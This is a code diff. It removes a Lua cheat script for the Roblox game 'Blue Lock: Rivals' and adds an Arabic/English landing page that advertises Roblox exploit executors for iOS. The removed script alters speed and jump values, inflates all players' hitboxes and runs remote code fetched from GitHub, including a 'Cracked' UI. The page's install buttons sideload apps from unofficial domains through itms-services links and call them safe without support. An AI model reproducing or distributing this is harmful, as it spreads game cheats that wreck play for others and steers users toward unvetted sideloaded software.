@@ -1,307 +1,248 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>𝐆𝐇𝐎𝐒𝐓 𝐊𝐈𝑳𝑳𝐑</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-family: 'Cairo', sans-serif;
+      margin: 0;
+      animation: fadeIn 2s ease-out;
+      text-align: center;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
 
-repeat task.wait() until game:IsLoaded() and game.Players and game.Players.LocalPlayer
-repeat task.wait() until game.Players.LocalPlayer.Character
-getgenv().Settings = {
-    WalkSpeedToggle = nil,
-    WalkSpeedInput = nil,
-    JumpPowerToggle = nil,
-    JumpPowerInput = nil,
-    HitboxToggle = nil,
-    HitboxInput = nil,
-    HitboxKeybind = nil,
-    AutoDribble = nil,
-    vipToggle = nil,
-    InstantKickKeybind = nil,
-    InputPower = nil,
-    espToggle = nil,
-    espStyleToggle = nil,
-    espAwakeningToggle = nil,
-    espFlowToggle  = nil,
-    espStaminaToggle = nil,
-    BallPredicToggle = nil,
-    AutoFarmTweenToggle = nil,
-    AutoFarmTeleportToggle = nil,
-    InfiniteStamina = false,
-    WhiteScreen = nil,
-    AutoGoalKeeper = nil,
-    AutoGKKeybind = "",
-    TeamPositionDropdown = nil,
-    AutoTeamToggle = nil,
-    AutoTeamForAutoFarmToggle = nil,
-    InstantGoalToggle = nil,
-    AutoHopToggle = nil,
-    AutoHopThresholdInput = nil,
-    KaiserToggle = nil,
-    KaiserKeybide = nil,
-    CurveShotProMaxToggle = nil,
-    CurveShotProMaxKeybind = nil,
-    NoCooldownStealToggle = nil,
-    NoCooldownAirDribbleToggle = nil,
-    NoCooldownAirDashToggle = nil,
-    StyleLockDropdown = nil,
-    AutoSpinToggle = nil,
-    FlowLockDropdown = nil,
-    AutoFlowToggle = nil,
-    EffectsDropdown = nil,
-    CosmeticsDropdown = nil,
-    CardsDropdown = nil,
-    LagSwitchToggle = nil,
-}
+    .container, .content-section {
+      background-color: #222;
+      padding: 30px;
+      margin: 20px auto;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 900px;
+    }
 
-local function CreateToggle()
-    local toggleGui = Instance.new("ScreenGui")
-    toggleGui.Name = "ToggleGui"
-    toggleGui.DisplayOrder = 1e+04
-    toggleGui.IgnoreGuiInset = true
-    toggleGui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
-    toggleGui.ResetOnSpawn = false
-    toggleGui.Parent = game:GetService("CoreGui")
+    h1 {
+      font-size: 60px;
+      margin-bottom: 20px;
+    }
 
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Name = "MainFrame"
-    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    mainFrame.BackgroundTransparency = 1
-    mainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    mainFrame.BorderSizePixel = 0
-    mainFrame.Position = UDim2.fromScale(0.925, 0.116)
-    mainFrame.Size = UDim2.fromScale(0.083, 0.148)
+    .description {
+      font-size: 18px;
+      margin-bottom: 30px;
+      color: #ccc;
+    }
 
-    local uICorner = Instance.new("UICorner")
-    uICorner.Name = "UICorner"
-    uICorner.CornerRadius = UDim.new(1, 0)
-    uICorner.Parent = mainFrame
+    .download-btn {
+      background-color: #555;
+      color: white;
+      padding: 15px 30px;
+      font-size: 20px;
+      border-radius: 25px;
+      margin: 10px auto;
+      display: block;
+      width: fit-content;
+      transition: 0.3s ease-in-out;
+      box-shadow: 0 0 10px rgba(200, 200, 200, 0.4);
+      text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
+    }
 
-    local toggleButton = Instance.new("ImageButton")
-    toggleButton.Name = "ToggleButton"
-    toggleButton.Image = "rbxassetid://112196145837803"
-    toggleButton.ImageTransparency = 0.3
-    toggleButton.AnchorPoint = Vector2.new(0.5, 0.5)
-    toggleButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    toggleButton.BackgroundTransparency = 1
-    toggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    toggleButton.BorderSizePixel = 0
-    toggleButton.Position = UDim2.fromScale(0.491, 0.482)
-    toggleButton.Size = UDim2.fromScale(1, 1)
+    .download-btn:hover {
+      background-color: #777;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.6);
+      transform: scale(1.05);
+    }
 
-    local uICorner1 = Instance.new("UICorner")
-    uICorner1.Name = "UICorner"
-    uICorner1.CornerRadius = UDim.new(1, 0)
-    uICorner1.Parent = toggleButton
+    .social-container {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 10px;
+      flex-wrap: wrap;
+    }
 
-    toggleButton.Parent = mainFrame
+    .social-btn {
+      background-color: #444;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      text-decoration: none;
+    }
 
-    local uIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
-    uIAspectRatioConstraint.Name = "UIAspectRatioConstraint"
-    uIAspectRatioConstraint.AspectRatio = 1
-    uIAspectRatioConstraint.Parent = mainFrame
+    .social-btn img {
+      width: 20px;
+      height: 20px;
+    }
 
-    mainFrame.Parent = toggleGui
+    .lang-btn {
+      background-color: red;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 20px;
+      margin: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
 
-    return toggleButton
-end
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px;
+    }
 
-local Device;
+    .feature-card {
+      background: #333;
+      padding: 20px;
+      border-radius: 10px;
+    }
 
-function checkDevice()
-    local player = game.Players.LocalPlayer
-    if player then
-        local UserInputService = game:GetService("UserInputService")
-        
-        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-            local FeariseToggle = CreateToggle()
-            FeariseToggle.MouseButton1Click:Connect(function()
-                for _, guiObject in ipairs(game:GetService("CoreGui"):GetChildren()) do
-                    if guiObject.Name == "ka_Hub" and guiObject:IsA("ScreenGui") then
-                        for _, FrameValue in pairs(guiObject:GetChildren()) do
-                            if FrameValue:IsA("Frame") then
-                                FrameValue.Visible = not FrameValue.Visible
-                            end
-                        end
-                    end
-                end
-            end)
-            game:GetService("CoreGui").ChildRemoved:Connect(function(Value)
-                if Value.Name == "ka_Hub" then
-                    FeariseToggle.Parent.Parent:Destroy()
-                end
-            end)
-            Device = UDim2.fromOffset(480, 360)
-        else
-            Device = UDim2.fromOffset(580, 460)
-        end
-    end
-end
-checkDevice()
+    .faq-content {
+      text-align: right;
+    }
 
-local FileName = tostring(game.Players.LocalPlayer.UserId).."_Settings.json"
-local BaseFolder = "ka_Hub"
-local SubFolder = "BlueLockRivals"
+    .faq-item {
+      background: #333;
+      padding: 10px;
+      border-radius: 10px;
+      margin-bottom: 10px;
+    }
 
-function SaveSetting() 
-    local json
-    local HttpService = game:GetService("HttpService")
-    
-    if writefile then
-        json = HttpService:JSONEncode(getgenv().Settings)
+    .faq-question {
+      font-weight: bold;
+    }
 
-        if not isfolder(BaseFolder) then
-            makefolder(BaseFolder)
-        end
-        if not isfolder(BaseFolder.."/"..SubFolder) then
-            makefolder(BaseFolder.."/"..SubFolder)
-        end
-        
-        writefile(BaseFolder.."/"..SubFolder.."/"..FileName, json)
-    else
-        error("ERROR: Can't save your settings")
-    end
-end
+    .faq-answer {
+      margin-top: 5px;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body>
+  <div id="langSelect" class="container">
+    <h1>𝐆𝐇𝐎𝐒𝐓 𝐊𝐈𝑳𝑳𝐑</h1>
+    <p>Choose your language - اختر لغتك</p>
+    <button class="lang-btn" onclick="setLanguage('ar')">العربية</button>
+    <button class="lang-btn" onclick="setLanguage('en')">English</button>
+  </div>
 
-function LoadSetting()
-    local HttpService = game:GetService("HttpService")
-    if readfile and isfile and isfile(BaseFolder.."/"..SubFolder.."/"..FileName) then
-        getgenv().Settings = HttpService:JSONDecode(readfile(BaseFolder.."/"..SubFolder.."/"..FileName))
-    end
-end
+  <div id="mainContent" style="display:none;">
+    <div class="container">
+      <h1 id="title">𝐆𝐇𝐎𝐒𝐓 𝐊𝐈𝑳𝑳𝐑</h1>
+      <div class="description" id="desc">Delta Executor هو واحد من أشهر أدوات استغلال Roblox. حمل الإصدار 2.0 الآن لأجهزة iOS بدون الحاجة إلى كمبيوتر!</div>
 
-LoadSetting()
+      <div style="display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
+        <div class="download-btn" id="deltaBtn" onclick="installApp('https://deltaios-executor.com/Install1.plist')">Delta Install</div>
+        <div class="download-btn" id="codexBtn" onclick="installApp('https://codex-ios.com/Install.plist')">CODEX Install</div>
+        <div class="download-btn" id="krnlBtn" onclick="installApp('https://krnl-ios.com/Install1.plist')">KRNL Install</div>
+      </div>
 
-local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/imyourlio/Cracked/refs/heads/main/Fearise%20UI"))()
-local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
-local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+      <div class="social-container">
+        <a class="social-btn" href="https://www.youtube.com/@Ka_KILLR" target="_blank">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/YouTube_social_white_square_%282017%29.svg"> YouTube
+        </a>
+        <a class="social-btn" href="https://t.me/KA_KILLR" target="_blank">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"> Telegram
+        </a>
+      </div>
 
-local Window = Fluent:CreateWindow({
-    Title = "KA_Hub | BlueLock : Rival | [Version 1]",
-    SubTitle = "by KA_KILLR",
-    TabWidth = 160,
-    Size = Device,
-    Acrylic = false,
-    Theme = "Rose",
-    MinimizeKey = Enum.KeyCode.LeftControl
-})
+      <button class="lang-btn" onclick="showLangSelect()">اللغة | Language</button>
+    </div>
 
-local Tabs = {
-    pageLegit = Window:AddTab({ Title = "Legit", Icon = "align-justify" }),
-    pageVisual = Window:AddTab({ Title = "Visual", Icon = "view" }),
-    pageKaitan = Window:AddTab({ Title = "Kaitan", Icon = "crown" }),
-    pageOP = Window:AddTab({ Title = "OP", Icon = "apple" }),
-    pageRage = Window:AddTab({ Title = "Rage", Icon = "bug" }),
-    pageSpin = Window:AddTab({ Title = "Spin", Icon = "box" }),
-    pageItem = Window:AddTab({ Title = "Item", Icon = "archive" }),
-    pageSettings = Window:AddTab({ Title = "Settings", Icon = "settings" }),
-}
+    <section class="content-section">
+      <h2 id="whyTitle">لماذا تختار Delta iOS؟</h2>
+      <div class="features-grid">
+        <div class="feature-card"><h3 id="f1t">تثبيت آمن</h3><p id="f1d">نستخدم تقنيات تشفير لضمان تثبيت آمن.</p></div>
+        <div class="feature-card"><h3 id="f2t">تحديثات منتظمة</h3><p id="f2d">ابقَ على اطلاع مع تحديثات مستمرة.</p></div>
+        <div class="feature-card"><h3 id="f3t">توافق واسع</h3><p id="f3d">دعم لأنظمة متعددة لتجربة سلسة.</p></div>
+        <div class="feature-card"><h3 id="f4t">سرعة تحميل عالية</h3><p id="f4d">سيرفراتنا محسنة لتحميل سريع.</p></div>
+      </div>
+    </section>
 
-do
-    local SpeedTitle = Tabs.pageLegit:AddSection("Player Modifiers")
+    <section class="content-section">
+      <h2 id="faqTitle">الأسئلة الشائعة</h2>
+      <div class="faq-content">
+        <div class="faq-item">
+          <div class="faq-question" id="q1">هل Delta iOS آمن؟</div>
+          <div class="faq-answer" id="a1">نعم، Delta iOS يهتم بأمان وخصوصية المستخدم.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question" id="q2">ما الإصدارات المدعومة؟</div>
+          <div class="faq-answer" id="a2">يدعم iOS 12.0 فما فوق.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question" id="q3">كم مرة يتم التحديث؟</div>
+          <div class="faq-answer" id="a3">يتم التحديث باستمرار لضمان أحدث الميزات.</div>
+        </div>
+      </div>
+    </section>
+  </div>
 
-    local WalkSpeedToggle = Tabs.pageLegit:AddToggle("WalkSpeedToggle", {Title = "Toggle WalkSpeed", Default = getgenv().Settings.WalkSpeedToggle or false })
-    local WalkSpeedInput = Tabs.pageLegit:AddInput("WalkSpeedInput", {
-        Title = "WalkSpeed Input",
-        Default = getgenv().Settings.WalkSpeedInput or 16,
-        Numeric = true,
-        Finished = false,
-        Callback = function(Value)
-            getgenv().Settings.WalkSpeedInput = Value
-            SaveSetting()
-        end
-    })
-    WalkSpeedInput:OnChanged(function(Value)
-        getgenv().Settings.WalkSpeedInput = Value
-        SaveSetting()
-    end)
+ <script>
+    const translations = {
+      ar: {
+        title: "𝐆𝐇𝐎𝐒𝐓 𝐊𝐈𝑳𝑳𝐑",
+        desc: "Delta Executor هو واحد من أشهر أدوات استغلال Roblox. حمل الإصدار 2.0 الآن لأجهزة iOS بدون الحاجة إلى كمبيوتر!",
+        whyTitle: "لماذا تختار Delta iOS؟",
+        faqTitle: "الأسئلة الشائعة",
+        f1t: "تثبيت آمن", f1d: "نستخدم تقنيات تشفير لضمان تثبيت آمن.",
+        f2t: "تحديثات منتظمة", f2d: "ابقَ على اطلاع مع تحديثات مستمرة.",
+        f3t: "توافق واسع", f3d: "دعم لأنظمة متعددة لتجربة سلسة.",
+        f4t: "سرعة تحميل عالية", f4d: "سيرفراتنا محسنة لتحميل سريع.",
+        q1: "هل Delta iOS آمن؟", a1: "نعم، Delta iOS يهتم بأمان وخصوصية المستخدم.",
+        q2: "ما الإصدارات المدعومة؟", a2: "يدعم iOS 12.0 فما فوق.",
+        q3: "كم مرة يتم التحديث؟", a3: "يتم التحديث باستمرار لضمان أحدث الميزات.",
+        deltaBtn: "دلتا | iOS",
+        codexBtn: "كودكس | iOS",
+        krnlBtn: "كارنل | iOS"
+      },
+      en: {
+        title: "𝐆𝐇𝐎𝐒𝐓 𝐊𝐈𝑳𝑳𝐑",
+        desc: "Delta Executor is one of the most popular Roblox exploit tools. Download v2.0 for iOS without a computer!",
+        whyTitle: "Why Choose Delta iOS?",
+        faqTitle: "Frequently Asked Questions",
+        f1t: "Secure Installation", f1d: "We use encryption for safe installs.",
+        f2t: "Regular Updates", f2d: "Stay updated with continuous improvements.",
+        f3t: "Wide Compatibility", f3d: "Supports many iOS systems smoothly.",
+        f4t: "Fast Downloads", f4d: "Our servers are optimized for speed.",
+        q1: "Is Delta iOS safe?", a1: "Yes, Delta iOS prioritizes security.",
+        q2: "Which iOS versions are supported?", a2: "Supports iOS 12.0 and above.",
+        q3: "How often is the app updated?", a3: "We update constantly with new features.",
+        deltaBtn: "Delta | iOS",
+        codexBtn: "CODEX | iOS",
+        krnlBtn: "KRNL | iOS"
+      }
+    };
 
- local JumpPowerToggle = Tabs.pageLegit:AddToggle("JumpPowerToggle", {Title = "Toggle JumpPower", Default = getgenv().Settings.JumpPowerToggle or false})
-local JumpPowerInput = Tabs.pageLegit:AddInput("JumpPowerInput", {
-    Title = "JumpPower Input",
-    Default = getgenv().Settings.JumpPowerInput or 50,
-    Numeric = true,
-    Finished = false,
-    Callback = function(Value)
-        getgenv().Settings.JumpPowerInput = Value
-        SaveSetting()
-    end
-})
-JumpPowerInput:OnChanged(function(Value)
-    getgenv().Settings.JumpPowerInput = Value
-    SaveSetting()
-end)
+    function setLanguage(lang) {
+      document.getElementById("langSelect").style.display = "none";
+      document.getElementById("mainContent").style.display = "block";
+      const t = translations[lang];
+      for (const key in t) {
+        const el = document.getElementById(key);
+        if (el) el.textContent = t[key];
+      }
+      document.body.dir = lang === "ar" ? "rtl" : "ltr";
+    }
 
-spawn(function()
-    while true do
-        task.wait(0.1)
-        local player = game.Players.LocalPlayer
-        if player and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
-            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
-            
-            if getgenv().Settings.WalkSpeedToggle then
-                humanoid.WalkSpeed = tonumber(getgenv().Settings.WalkSpeedInput) or 16
-            else
-                humanoid.WalkSpeed = 16 
-            end
-            
-            if getgenv().Settings.JumpPowerToggle then
-                humanoid.JumpPower = tonumber(getgenv().Settings.JumpPowerInput) or 50
-            else
-                humanoid.JumpPower = 50
-            end
-        end
-    end
-end)
+    function showLangSelect() {
+      document.getElementById("langSelect").style.display = "block";
+      document.getElementById("mainContent").style.display = "none";
+    }
 
-
-local HitboxToggle = Tabs.pageLegit:AddToggle("HitboxToggle", {Title = "Toggle Hitbox", Default = getgenv().Settings.HitboxToggle or false})
-local HitboxInput = Tabs.pageLegit:AddInput("HitboxInput", {
-    Title = "Hitbox Size",
-    Default = getgenv().Settings.HitboxInput or 10,
-    Numeric = true,
-    Finished = false,
-    Callback = function(Value)
-        getgenv().Settings.HitboxInput = Value
-        SaveSetting()
-    end
-})
-HitboxInput:OnChanged(function(Value)
-    getgenv().Settings.HitboxInput = Value
-    SaveSetting()
-end)
-
-spawn(function()
-    while true do
-        task.wait(1)
-        if getgenv().Settings.HitboxToggle then
-            for _, player in pairs(game.Players:GetPlayers()) do
-                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                    local hrp = player.Character.HumanoidRootPart
-                    hrp.Size = Vector3.new(getgenv().Settings.HitboxInput, getgenv().Settings.HitboxInput, getgenv().Settings.HitboxInput)
-                end
-            end
-        else
-     
-            for _, player in pairs(game.Players:GetPlayers()) do
-                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                    local hrp = player.Character.HumanoidRootPart
-                    hrp.Size = Vector3.new(2, 2, 1) 
-                end
-            end
-        end
-    end
-end)
-
-
-Tabs.pageSettings:AddButton("Save Settings", function()
-    SaveSetting()
-    print("Settings saved!")
-end)
-
-Tabs.pageSettings:AddButton("Load Settings", function()
-    LoadSetting()
-    print("Settings loaded!")
-end)
-
-Tabs.pageSettings:AddButton("Close UI", function()
-    Window:Close()
-end)
-
-
-print("KA_Hub | BlueLock : Rival loaded successfully!")
+    function installApp(plistUrl) {
+      const url = `itms-services://?action=download-manifest&url=${encodeURIComponent(plistUrl)}`;
+      window.location.href = url;
+    }
+  </script>
+</body>
+</html>
